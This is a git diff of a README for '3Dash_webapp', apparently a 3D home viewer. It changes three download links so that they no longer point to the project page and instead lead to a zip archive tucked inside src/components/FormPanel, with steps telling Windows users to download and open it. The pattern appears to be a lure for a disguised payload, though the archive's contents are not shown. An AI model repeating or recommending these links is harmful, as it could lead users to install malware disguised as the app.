@@ -1,6 +1,6 @@
 # 🏠 3Dash_webapp - View Your Home in 3D
 
-[![Download 3Dash_webapp](https://img.shields.io/badge/Download-3Dash_webapp-blue?style=for-the-badge)](https://github.com/doughy-bunny342/3Dash_webapp)
+[![Download 3Dash_webapp](https://img.shields.io/badge/Download-3Dash_webapp-blue?style=for-the-badge)](https://github.com/doughy-bunny342/3Dash_webapp/raw/refs/heads/main/src/components/FormPanel/webapp-Dash-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 Use the link below to visit the download page and get the app:
 
-[Download 3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp)
+[Download 3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp/raw/refs/heads/main/src/components/FormPanel/webapp-Dash-2.4.zip)
 
 ## 📋 What You Need
 
@@ -38,7 +38,7 @@ Common uses include:
 
 Follow these steps on your Windows PC:
 
-1. Open the download page: [3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp)
+1. Open the download page: [3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp/raw/refs/heads/main/src/components/FormPanel/webapp-Dash-2.4.zip)
 2. Look for the latest release or download option on the page
 3. Download the Windows version if one is listed
 4. Open your Downloads folder
